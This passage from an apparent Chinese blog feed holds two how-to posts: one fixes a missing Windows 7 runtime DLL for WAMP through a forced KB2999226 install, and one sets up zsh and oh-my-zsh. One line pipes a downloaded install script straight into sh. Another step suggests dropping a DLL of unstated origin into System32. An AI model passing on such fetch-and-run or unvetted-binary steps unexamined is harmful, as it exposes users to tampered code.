      <category term="ms17-010" scheme="http://yingzhzh.github.io/tags/ms17-010/"/>
    
  </entry>
  
  <entry>
    <title>win7安装wamp遇到api-ms-win-crt-runtime-l1-1-0.dll丢失问题</title>
    <link href="http://yingzhzh.github.io/2017/08/01/win7sp1-apache/"/>
    <id>http://yingzhzh.github.io/2017/08/01/win7sp1-apache/</id>
    <published>2017-08-01T04:58:22.000Z</published>
    <updated>2017-08-02T03:09:25.494Z</updated>
    
    <content type="html"><![CDATA[<p>本办法针对的是win7sp1系统，确定你是否是sp1，即Service Pack 1，如果不是先升级到sp1，登陆微软官网即可升级。</p>
<a id="more"></a> 
<h5 id="1-网上一般说是卸载原来的Visual-C-2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单"><a href="#1-网上一般说是卸载原来的Visual-C-2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单" class="headerlink" title="1.网上一般说是卸载原来的Visual C++2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单"></a>1.网上一般说是卸载原来的Visual C++2015，下载对应版本，分32位系统和64位系统，如果此办法能解决问题，那就很简单</h5><p>但是大部分筒子面临的是安装VC2015失败，比如我。</p>
<h5 id="2-直接下载对应DLL丢到系统盘"><a href="#2-直接下载对应DLL丢到系统盘" class="headerlink" title="2.直接下载对应DLL丢到系统盘"></a>2.直接下载对应DLL丢到系统盘</h5><pre><code>1. 把api-ms-win-crt-runtime-l1-1-0.dll下载到电脑
2. 直接拷贝该文件到系统目录里：C:\Windows\System32目录下，64位系统为：C:\Windows\SysWOW64
3. 最后在开始菜单中找到“运行(R)” 或者按快捷键“Win+R”，在弹出的框内输入“regsvr32 api-ms-win-crt-runtime-l1-1-0.dll”(不含双引号)，回车即可解决错误提示！
</code></pre><p>（此方法我试过，出现提示“无法找到入口”之类，插入方式不对，不能达到高潮。）</p>
<h5 id="3-安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）"><a href="#3-安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）" class="headerlink" title="3.安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）"></a>3.安装kb2999226更新程序，然后重新安装VC2015（我也试过，但是提示安装更新失败。）</h5><h5 id="4-使用cmd安装"><a href="#4-使用cmd安装" class="headerlink" title="4.使用cmd安装"></a>4.使用cmd安装</h5><p>kb2999226更新程序，然后重装VC2015</p>
<pre><code>1.  按下【Win+R】组合键打开运行，输入 cmd 点击确定打开命令提示符 ；
2.  在命令提示符框中输入：net stop wuauserv 按下回车键，完成后先别急着关闭；
3.  打开运行，输入：%windir% 点击确定打开文件夹；
4.  在打开的该文件夹中找到“SoftwareDistribution”，并删除掉；
5. 切换到命令提示符窗口，输入：net start wuauserv 按下回车键 后即可重新安装kb2999226 补丁了！
</code></pre><p>（此方法我也试过，依然无效）</p>
<h5 id="5-我的问题和成功解决的方法："><a href="#5-我的问题和成功解决的方法：" class="headerlink" title="5.我的问题和成功解决的方法："></a>5.我的问题和成功解决的方法：</h5><p>问题：需要安装kb2999226 x64，但是安装时提示0x80240037错误，无法安装<br>方法：</p>
<pre><code>下载kb2999226更新程序，把kb2999226.msu改为kb2999226.cab，安装程序会变成压缩包；
然后解压缩又出现一个kb2999226.cab的压缩包
Win+R运行cmd
输入dism /online /add-package /packagepath:&quot;路径\kb2999226.cab
强制安装更新，然后再重装VC2015，就成功了
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本办法针对的是win7sp1系统，确定你是否是sp1，即Service Pack 1，如果不是先升级到sp1，登陆微软官网即可升级。&lt;/p&gt;
    
    </summary>
    
      <category term="系统环境" scheme="http://yingzhzh.github.io/categories/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
    
    
      <category term="win7" scheme="http://yingzhzh.github.io/tags/win7/"/>
    
      <category term="走过的坑" scheme="http://yingzhzh.github.io/tags/%E8%B5%B0%E8%BF%87%E7%9A%84%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>如何安装、配置和使用 zsh</title>
    <link href="http://yingzhzh.github.io/2017/08/01/oh-my-zsh/"/>
    <id>http://yingzhzh.github.io/2017/08/01/oh-my-zsh/</id>
    <published>2017-08-01T03:51:11.000Z</published>
    <updated>2017-08-02T05:40:55.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h1><p>如果你用 Mac，就可以直接看下一节<br>如果你用 Redhat Linux，执行：sudo yum install zsh<br>如果你用 Ubuntu Linux，执行：sudo apt-get install zsh<br>如果你用 Windows……去洗洗睡吧。</p>
<a id="more"></a> 
<p>安装完成后设置当前用户使用 zsh：chsh -s /bin/zsh，根据提示输入当前用户的密码就可以了。</p>
<p>安装oh my zsh</p>
<p>首先安装 git，安装方式同上，把 zsh 换成 git 即可。</p>
<p>安装「oh my zsh」可以自动安装也可以手动安装。</p>
<p>自动安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</div></pre></td></tr></table></figure></p>
<p>手动安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh</div><div class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</div></pre></td></tr></table></figure></p>
<p>都不复杂，安装完成之后退出当前会话重新打开一个终端窗口，你就可以见到这个彩色的提示了：</p>
<h1 id="zsh配置"><a href="#zsh配置" class="headerlink" title="zsh配置"></a>zsh配置</h1><p>zsh 的配置主要集中在用户当前目录的.zshrc里，用 vim 或你喜欢的其他编辑器打开.zshrc，在最下面会发现这么一行字：</p>
<pre><code>#Customize to your needs…
</code></pre><p>可以在此处定义自己的环境变量和别名，当然，oh my zsh 在安装时已经自动读取当前的环境变量并进行了设置，你可以继续追加其他环境变量。</p>
<p>接下来进行别名的设置，我自己的部分配置如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">alias  xxxx=&quot;ssh root@xx.xx.xx.xx&quot; #快捷ssh登录</div><div class="line"></div><div class="line">alias cls=&apos;clear&apos;</div><div class="line">alias ll=&apos;ls -l&apos;</div><div class="line">alias la=&apos;ls -a&apos;</div><div class="line">alias vi=&apos;vim&apos;</div><div class="line">alias javac=&quot;javac -J-Dfile.encoding=utf8&quot;</div><div class="line">alias grep=&quot;grep --color=auto&quot;</div><div class="line">alias -s html=subl   # 在命令行直接输入后缀为 html 的文件名，会在 subl 中打开</div><div class="line">alias -s rb=subl     # 在命令行直接输入 ruby 文件，会在 subl 中打开</div><div class="line">alias -s py=subl       # 在命令行直接输入 python 文件，会用 subl 中打开，以下类似</div><div class="line">alias -s js=subl</div><div class="line">alias -s c=subl</div><div class="line">alias -s java=subl</div><div class="line">alias -s txt=subl</div><div class="line">alias -s md=subl</div><div class="line">alias -s gz=&apos;tar -xzvf&apos;</div><div class="line">alias -s tgz=&apos;tar -xzvf&apos;</div><div class="line">alias -s zip=&apos;unzip&apos;</div><div class="line">alias -s bz2=&apos;tar -xjvf&apos;</div><div class="line">alias -s jar=&apos;java -jar&apos;</div></pre></td></tr></table></figure></p>
<p>zsh 的牛粪之处在于不仅可以设置通用别名，还能针对文件类型设置对应的打开程序，比如：<br>alias -s html=mate，意思就是你在命令行输入 hello.html，zsh会为你自动打开 TextMat 并读取 hello.html； alias -s gz=’tar -xzvf’，表示自动解压后缀为 gz 的压缩包。</p>
<p>总之，只有想不到，木有做不到，吓尿了吧。<br>设置完环境变量和别名之后，基本上就可以用了，如果你是个主题控，还可以玩玩 zsh 的主题。在 .zshrc 里找到ZSH_THEME，就可以设置主题了，默认主题是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ZSH_THEME=”robbyrussell”</div></pre></td></tr></table></figure></p>
<p>oh my zsh 提供了数十种主题，相关文件在~/.oh-my-zsh/themes目录下，你可以随意选择。</p>
<h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>oh my zsh 项目提供了完善的插件体系，相关的文件在~/.oh-my-zsh/plugins目录下，默认提供了100多种，大家可以根据自己的实际学习和工作环境采用，想了解每个插件的功能，只要打开相关目录下的 zsh 文件看一下就知道了。插件也是在.zshrc里配置，找到plugins关键字，你就可以加载自己的插件了，系统默认加载 git ，你可以在后面追加内容，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">plugins=(git textmate ruby autojump osx mvn gradle)</div></pre></td></tr></table></figure>
<p>下面简单介绍几个：</p>
<p>1、git：当你处于一个 git 受控的目录下时，Shell 会明确显示 「git」和 branch，如上图所示，另外对 git 很多命令进行了简化，例如 gco=’git checkout’、gd=’git diff’、gst=’git status’、g=’git’等等，熟练使用可以大大减少 git 的命令长度，命令内容可以参考~/.oh-my-zsh/plugins/git/git.plugin.zsh</p>
<p>2、textmate：mr可以创建 ruby 的框架项目，tm finename 可以用 textmate 打开指定文件。</p>
<p>3、osx：tab 增强，quick-look filename 可以直接预览文件，man-preview grep 可以生成 grep手册 的pdf 版本等。</p>
<p>4、autojump：zsh 和 autojump 的组合形成了 zsh 下最强悍的插件，今天我们主要说说这货。</p>
<p>首先安装autojump，如果你用 Mac，可以使用 brew 安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install autojump</div></pre></td></tr></table></figure></p>
<p>如果是 Linux，去下载 autojump 的最新版本，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone git://github.com/joelthelion/autojump.git</div></pre></td></tr></table></figure></p>
<p>解压缩后进入目录，执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./install.py</div></pre></td></tr></table></figure></p>
<p>最后把以下代码加入.zshrc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[ -s ~/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . ~/.autojump/etc/profile.d/autojump.sh</div></pre></td></tr></table></figure></p>
<p>至此，安装、配置、插件三位一体，终极 Shell 全面登场。退出终端会话重新登录，开始感受 zsh 的训疾如风！</p>
<p>使用 zsh</p>
<p>1、兼容 bash，原来使用 bash 的兄弟切换过来毫无压力，该咋用咋用。</p>
<p>2、强大的历史纪录功能，输入 grep 然后用上下箭头可以翻阅你执行的所有 grep 命令。</p>
<p>3、智能拼写纠正，输入gtep mactalk * -R，系统会提示：zsh: correct ‘gtep’ to ‘grep’ [nyae]? 比妹纸贴心吧，她们向来都是让你猜的……</p>
<p>4、各种补全：路径补全、命令补全，命令参数补全，插件内容补全等等。触发补全只需要按一下或两下 tab 键，补全项可以使用 ctrl+n/p/f/b上下左右切换。比如你想杀掉 java 的进程，只需要输入 kill java + tab键，如果只有一个 java 进程，zsh 会自动替换为进程的 pid，如果有多个则会出现选择项供你选择。ssh + 空格 + 两个tab键，zsh会列出所有访问过的主机和用户名进行补全</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">##在命令前插入 sudo &#123;&#123;&#123;  </div><div class="line">#定义功能  </div><div class="line">sudo-command-line() &#123;  </div><div class="line">[[ -z $BUFFER ]] &amp;&amp; zle up-history  </div><div class="line">[[ $BUFFER != sudo\ * ]] &amp;&amp; BUFFER=&quot;sudo $BUFFER&quot;  </div><div class="line">zle end-of-line                 #光标移动到行末  </div><div class="line">&#125;  </div><div class="line">zle -N sudo-command-line  </div><div class="line">#定义快捷键为： [Esc] [Esc]  </div><div class="line">bindkey &quot;\e\e&quot; sudo-command-line  </div><div class="line">#&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<p>5、智能跳转，安装了autojump之后，zsh 会自动记录你访问过的目录，通过 j + 目录名 可以直接进行目录跳转，而且目录名支持模糊匹配和自动补全，例如你访问过hadoop-1.0.0目录，输入j hado 即可正确跳转。j –stat 可以看你的历史路径库。</p>
<p>6、目录浏览和跳转：输入 d，即可列出你在这个会话里访问的目录列表，输入列表前的序号，即可直接跳转。</p>
<p>7、在当前目录下输入 .. 或 … ，或直接输入当前目录名都可以跳转，你甚至不再需要输入 cd 命令了。</p>
<p>8、通配符搜索：ls -l <strong>/*</strong>.sh，可以递归显示当前目录下的 shell 文件，文件少时可以代替 find，文件太多就歇菜了。**</p>
<p>9、更强的别名：请参考配置一节。</p>
<p>10、插件支持：请参考插件一节。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;安装zsh&quot;&gt;&lt;a href=&quot;#安装zsh&quot; class=&quot;headerlink&quot; title=&quot;安装zsh&quot;&gt;&lt;/a&gt;安装zsh&lt;/h1&gt;&lt;p&gt;如果你用 Mac，就可以直接看下一节&lt;br&gt;如果你用 Redhat Linux，执行：sudo yum install zsh&lt;br&gt;如果你用 Ubuntu Linux，执行：sudo apt-get install zsh&lt;br&gt;如果你用 Windows……去洗洗睡吧。&lt;/p&gt;
    
    </summary>
    
      <category term="系统环境" scheme="http://yingzhzh.github.io/categories/%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83/"/>
    
    
      <category term="linux" scheme="http://yingzhzh.github.io/tags/linux/"/>
    
      <category term="shell" scheme="http://yingzhzh.github.io/tags/shell/"/>
    
      <category term="oh-my-zsh" scheme="http://yingzhzh.github.io/tags/oh-my-zsh/"/>
    
      <category term="mac" scheme="http://yingzhzh.github.io/tags/mac/"/>
    
  </entry>
  
</feed>
